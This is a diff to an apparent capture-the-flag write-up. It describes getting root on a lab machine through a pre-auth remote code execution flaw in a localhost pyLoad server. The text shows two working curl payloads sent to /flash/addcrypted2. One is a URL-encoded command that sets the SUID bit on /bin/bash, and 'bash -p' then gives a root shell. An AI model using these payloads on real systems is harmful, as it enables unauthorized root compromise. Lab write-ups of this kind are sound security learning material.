@@ -43,19 +43,16 @@ There were 'Services listening only on localhost' so I used 'netstat -ant' to fi
 'pyLoad' server is found on the port 
 I tried the default username and password but didn't get in.
 
-There is a pre-auth RCE exploit available.
-
+Searched for 'pyloader vulnerability' and there is a pre-auth RCE exploit available.
+This was the proof of concept exploit code:
 curl -i -s -k -X $'POST' \
     --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/pwnd\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
     $'http://127.0.0.1:8000/flash/addcrypted2'
-   
+
+I edited it a bit to chmod /bin/bash and encoded it to the URL.
 curl -i -s -k -X $'POST' \
     --data-binary $'jk=pyimport%20os;os.system(\"%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
     $'http://127.0.0.1:8000/flash/addcrypted2'
 
-bash -p
-
-
-
-
-
+Finally used  'bash -p' privileged shell.
+The flag was in /root/root.txt
